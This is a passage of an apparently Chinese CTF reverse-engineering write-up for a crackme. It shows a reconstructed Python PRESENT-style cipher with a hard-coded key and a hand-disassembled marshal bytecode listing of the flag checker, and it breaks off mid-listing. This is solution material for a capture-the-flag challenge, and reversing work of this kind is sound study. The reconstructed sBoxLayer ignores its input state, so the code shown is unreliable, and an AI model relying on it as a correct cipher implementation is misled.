class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    generateRoundkeys80(<span class="number">85354531916197809168417</span>,rounds)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        state = string2number(block)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds-<span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state,roundkeys[i]) <span class="comment"># roundkeys是数组</span></span><br><span class="line">            state = sBoxLayer(state)</span><br><span class="line">            state = pLayer(state)</span><br><span class="line">        cipher = addRoundKey(state,roundkeys[-<span class="number">1</span>])</span><br><span class="line">        out.append(cipher)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state,roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state^roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string2number</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([<span class="built_in">ord</span>(i[c])&lt;&lt;(<span class="number">8</span>*c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox[(<span class="number">4</span>*i&gt;&gt;<span class="number">15</span>)&amp;<span class="number">15</span>]&lt;&lt;(<span class="number">4</span>*i)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state&gt;&gt;i)&amp;<span class="number">1</span>)&lt;&lt;PBox[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate the roundkeys for a 80-bit key</span></span><br><span class="line"><span class="string">    Input:</span></span><br><span class="line"><span class="string">            key:    the key as a 80-bit integer</span></span><br><span class="line"><span class="string">            rounds: the number of rounds as an integer</span></span><br><span class="line"><span class="string">    Output: list of 64-bit roundkeys as integers&quot;&quot;&quot;</span></span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, rounds + <span class="number">1</span>):  <span class="comment"># (K1 ... K32)</span></span><br><span class="line">        <span class="comment"># rawkey: used in comments to show what happens at bitlevel</span></span><br><span class="line">        <span class="comment"># rawKey[0:64]</span></span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 1. Shift</span></span><br><span class="line">        <span class="comment"># rawKey[19:len(rawKey)]+rawKey[0:19]</span></span><br><span class="line">        key = ((key &amp; (<span class="number">2</span> ** <span class="number">19</span> - <span class="number">1</span>)) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">        <span class="comment"># 2. SBox</span></span><br><span class="line">        <span class="comment"># rawKey[76:80] = S(rawKey[76:80])</span></span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; (<span class="number">2</span> ** <span class="number">76</span> - <span class="number">1</span>))</span><br><span class="line">        <span class="comment">#3. Salt</span></span><br><span class="line">        <span class="comment">#rawKey[15:20] ^ i</span></span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>)^(key&gt;&gt;<span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br></pre></td></tr></table></figure><p>最后放一份手脱marshal的大致字节码:</p><details><summary>点击查看代码</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br></pre></td><td class="code"><pre><span class="line">  3           0 LOAD_CONST               0 (12)</span><br><span class="line">              2 LOAD_CONST               1 (5)</span><br><span class="line">              4 LOAD_CONST               2 (6)</span><br><span class="line">              6 LOAD_CONST               3 (11)</span><br><span class="line">              8 LOAD_CONST               4 (9)</span><br><span class="line">             10 LOAD_CONST               5 (0)</span><br><span class="line">             12 LOAD_CONST               6 (10)</span><br><span class="line">             14 LOAD_CONST               7 (13)</span><br><span class="line">             16 LOAD_CONST               8 (3)</span><br><span class="line">             18 LOAD_CONST               9 (14)</span><br><span class="line">             20 LOAD_CONST              10 (15)</span><br><span class="line">             22 LOAD_CONST              11 (8)</span><br><span class="line">             24 LOAD_CONST              12 (4)</span><br><span class="line">             26 LOAD_CONST              13 (7)</span><br><span class="line">             28 LOAD_CONST              14 (1)</span><br><span class="line">             30 LOAD_CONST              15 (2)</span><br><span class="line">             32 BUILD_LIST              16</span><br><span class="line">             34 STORE_NAME               0 (Sbox)</span><br><span class="line"></span><br><span class="line">  4          36 LOAD_CONST              16 (&lt;code object &lt;listcomp&gt; at 0x7f7b29b00a80, file &quot;&quot;, line 4&gt;)</span><br><span class="line">             38 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">             40 MAKE_FUNCTION            0</span><br><span class="line">             42 LOAD_NAME                1 (range)</span><br><span class="line">             44 LOAD_CONST              18 (16)</span><br><span class="line">             46 CALL_FUNCTION            1</span><br><span class="line">             48 GET_ITER</span><br><span class="line">             50 CALL_FUNCTION            1</span><br><span class="line">             52 STORE_NAME               2 (Sbox_inv)</span><br><span class="line"></span><br><span class="line">  5          54 LOAD_CONST               5 (0)</span><br><span class="line">             56 LOAD_CONST              18 (16)</span><br><span class="line">             58 LOAD_CONST              19 (32)</span><br><span class="line">             60 LOAD_CONST              20 (48)</span><br><span class="line">             62 LOAD_CONST              14 (1)</span><br><span class="line">             64 LOAD_CONST              21 (17)</span><br><span class="line">             66 LOAD_CONST              22 (33)</span><br><span class="line">             68 LOAD_CONST              23 (49)</span><br><span class="line">             70 LOAD_CONST              15 (2)</span><br><span class="line">             72 LOAD_CONST              24 (18)</span><br><span class="line">             74 LOAD_CONST              25 (34)</span><br><span class="line">             76 LOAD_CONST              26 (50)</span><br><span class="line">             78 LOAD_CONST               8 (3)</span><br><span class="line">             80 LOAD_CONST              27 (19)</span><br><span class="line">             82 LOAD_CONST              28 (35)</span><br><span class="line">             84 LOAD_CONST              29 (51)</span><br><span class="line"></span><br><span class="line">  6          86 LOAD_CONST              12 (4)</span><br><span class="line">             88 LOAD_CONST              30 (20)</span><br><span class="line">             90 LOAD_CONST              31 (36)</span><br><span class="line">             92 LOAD_CONST              32 (52)</span><br><span class="line">             94 LOAD_CONST               1 (5)</span><br><span class="line">             96 LOAD_CONST              33 (21)</span><br><span class="line">             98 LOAD_CONST              34 (37)</span><br><span class="line">            100 LOAD_CONST              35 (53)</span><br><span class="line">            102 LOAD_CONST               2 (6)</span><br><span class="line">            104 LOAD_CONST              36 (22)</span><br><span class="line">            106 LOAD_CONST              37 (38)</span><br><span class="line">            108 LOAD_CONST              38 (54)</span><br><span class="line">            110 LOAD_CONST              13 (7)</span><br><span class="line">            112 LOAD_CONST              39 (23)</span><br><span class="line">            114 LOAD_CONST              40 (39)</span><br><span class="line">            116 LOAD_CONST              41 (55)</span><br><span class="line"></span><br><span class="line">  7         118 LOAD_CONST              11 (8)</span><br><span class="line">            120 LOAD_CONST              42 (24)</span><br><span class="line">            122 LOAD_CONST              43 (40)</span><br><span class="line">            124 LOAD_CONST              44 (56)</span><br><span class="line">            126 LOAD_CONST               4 (9)</span><br><span class="line">            128 LOAD_CONST              45 (25)</span><br><span class="line">            130 LOAD_CONST              46 (41)</span><br><span class="line">            132 LOAD_CONST              47 (57)</span><br><span class="line">            134 LOAD_CONST               6 (10)</span><br><span class="line">            136 LOAD_CONST              48 (26)</span><br><span class="line">            138 LOAD_CONST              49 (42)</span><br><span class="line">            140 LOAD_CONST              50 (58)</span><br><span class="line">            142 LOAD_CONST               3 (11)</span><br><span class="line">            144 LOAD_CONST              51 (27)</span><br><span class="line">            146 LOAD_CONST              52 (43)</span><br><span class="line">            148 LOAD_CONST              53 (59)</span><br><span class="line"></span><br><span class="line">  8         150 LOAD_CONST               0 (12)</span><br><span class="line">            152 LOAD_CONST              54 (28)</span><br><span class="line">            154 LOAD_CONST              55 (44)</span><br><span class="line">            156 LOAD_CONST              56 (60)</span><br><span class="line">            158 LOAD_CONST               7 (13)</span><br><span class="line">            160 LOAD_CONST              57 (29)</span><br><span class="line">            162 LOAD_CONST              58 (45)</span><br><span class="line">            164 LOAD_CONST              59 (61)</span><br><span class="line">            166 LOAD_CONST               9 (14)</span><br><span class="line">            168 LOAD_CONST              60 (30)</span><br><span class="line">            170 LOAD_CONST              61 (46)</span><br><span class="line">            172 LOAD_CONST              62 (62)</span><br><span class="line">            174 LOAD_CONST              10 (15)</span><br><span class="line">            176 LOAD_CONST              63 (31)</span><br><span class="line">            178 LOAD_CONST              64 (47)</span><br><span class="line">            180 LOAD_CONST              65 (63)</span><br><span class="line"></span><br><span class="line">  5         182 BUILD_LIST              64</span><br><span class="line">            184 STORE_NAME               3 (PBox)</span><br><span class="line"></span><br><span class="line">  9         186 LOAD_CONST              66 (&lt;code object &lt;listcomp&gt; at 0x7f7b29a76a80, file &quot;&quot;, line 9&gt;)</span><br><span class="line">            188 LOAD_CONST              17 (&#x27;&lt;listcomp&gt;&#x27;)</span><br><span class="line">            190 MAKE_FUNCTION            0</span><br><span class="line">            192 LOAD_NAME                1 (range)</span><br><span class="line">            194 LOAD_CONST              67 (64)</span><br><span class="line">            196 CALL_FUNCTION            1</span><br><span class="line">            198 GET_ITER</span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            202 STORE_NAME               4 (PBox_inv)</span><br><span class="line"></span><br><span class="line"> 11         204 LOAD_NAME                5 (marshal)</span><br><span class="line">            206 LOAD_METHOD              6 (loads)</span><br><span class="line">              2           0 LOAD_CONST               0 (&lt;code object addRoundKey at 0x7f5223878a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;addRoundKey&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (addRoundKey)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object sBoxLayer at 0x7fab1d117a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;sBoxLayer&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (sBoxLayer)</span><br><span class="line"></span><br><span class="line">  8           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object pLayer at 0x7f023882ba80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;pLayer&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (pLayer)</span><br><span class="line"></span><br><span class="line">  8           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object string2number at 0x7f7370421a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;string2number&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (string2number)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object generateRoundkeys80 at 0x7f133db26a80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;generateRoundkeys80&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (generateRoundkeys80)</span><br><span class="line"></span><br><span class="line"> 11           8 LOAD_NAME                1 (marshal)</span><br><span class="line">             10 LOAD_METHOD              2 (loads)</span><br><span class="line">               2           0 LOAD_CONST               0 (&lt;code object encrypt at 0x7f57c4c3aa80, file &quot;&quot;, line 2&gt;)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;encrypt&#x27;)</span><br><span class="line">              4 MAKE_FUNCTION            0</span><br><span class="line">              6 STORE_NAME               0 (encrypt)</span><br><span class="line"></span><br><span class="line"> 16           8 LOAD_NAME                1 (input)</span><br><span class="line">             10 LOAD_CONST               2 (&#x27;pls input ur flag:&#x27;)</span><br><span class="line">             12 CALL_FUNCTION            1</span><br><span class="line">             14 STORE_NAME               2 (inp)</span><br><span class="line"></span><br><span class="line"> 17          16 LOAD_NAME                3 (len)</span><br><span class="line">             18 LOAD_NAME                2 (inp)</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 LOAD_CONST               3 (32)</span><br><span class="line">             24 COMPARE_OP               3 (!=)</span><br><span class="line">             26 POP_JUMP_IF_FALSE       44</span><br><span class="line"></span><br><span class="line"> 18          28 LOAD_NAME                4 (print)</span><br><span class="line">             30 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">             32 CALL_FUNCTION            1</span><br><span class="line">             34 POP_TOP</span><br><span class="line"></span><br><span class="line"> 19          36 LOAD_NAME                5 (exit)</span><br><span class="line">             38 LOAD_CONST               5 (0)</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 POP_TOP</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;   44 LOAD_NAME                2 (inp)</span><br><span class="line">             46 LOAD_CONST               6 (None)</span><br><span class="line">             48 LOAD_CONST               7 (8)</span><br><span class="line">             50 BUILD_SLICE              2</span><br><span class="line">             52 BINARY_SUBSCR</span><br><span class="line">             54 LOAD_NAME                2 (inp)</span><br><span class="line">             56 LOAD_CONST               7 (8)</span><br><span class="line">             58 LOAD_CONST               8 (16)</span><br><span class="line">             60 BUILD_SLICE              2</span><br><span class="line">             62 BINARY_SUBSCR</span><br><span class="line">             64 LOAD_NAME                2 (inp)</span><br><span class="line">             66 LOAD_CONST               8 (16)</span><br><span class="line">             68 LOAD_CONST               9 (24)</span><br><span class="line">             70 BUILD_SLICE              2</span><br><span class="line">             72 BINARY_SUBSCR</span><br><span class="line">             74 LOAD_NAME                2 (inp)</span><br><span class="line">             76 LOAD_CONST               9 (24)</span><br><span class="line">             78 LOAD_CONST               3 (32)</span><br><span class="line">             80 BUILD_SLICE              2</span><br><span class="line">             82 BINARY_SUBSCR</span><br><span class="line">             84 BUILD_LIST               4</span><br><span class="line">             86 STORE_NAME               6 (blocks)</span><br><span class="line"></span><br><span class="line"> 21          88 LOAD_CONST              10 (120617461261311902)</span><br><span class="line">             90 LOAD_CONST              11 (16357837616839286114)</span><br><span class="line">             92 LOAD_CONST              12 (312508749794633008)</span><br><span class="line">             94 LOAD_CONST              13 (1843701600916795272)</span><br><span class="line">             96 BUILD_LIST               4</span><br><span class="line">             98 STORE_NAME               7 (cmps)</span><br><span class="line"></span><br><span class="line"> 22         100 LOAD_NAME                0 (encrypt)</span><br><span class="line">            102 LOAD_NAME                6 (blocks)</span><br><span class="line">            104 CALL_FUNCTION            1</span><br><span class="line">            106 STORE_NAME               8 (out_blocks)</span><br><span class="line"></span><br><span class="line"> 23         108 LOAD_NAME                9 (range)</span><br><span class="line">            110 LOAD_CONST              14 (4)</span><br><span class="line">            112 CALL_FUNCTION            1</span><br><span class="line">            114 GET_ITER</span><br><span class="line">        &gt;&gt;  116 FOR_ITER                36 (to 154)</span><br><span class="line">            118 STORE_NAME              10 (i)</span><br><span class="line"></span><br><span class="line"> 24         120 LOAD_NAME                7 (cmps)</span><br><span class="line">            122 LOAD_NAME               10 (i)</span><br><span class="line">            124 BINARY_SUBSCR</span><br><span class="line">            126 LOAD_NAME                8 (out_blocks)</span><br><span class="line">            128 LOAD_NAME               10 (i)</span><br><span class="line">            130 BINARY_SUBSCR</span><br><span class="line">            132 COMPARE_OP               3 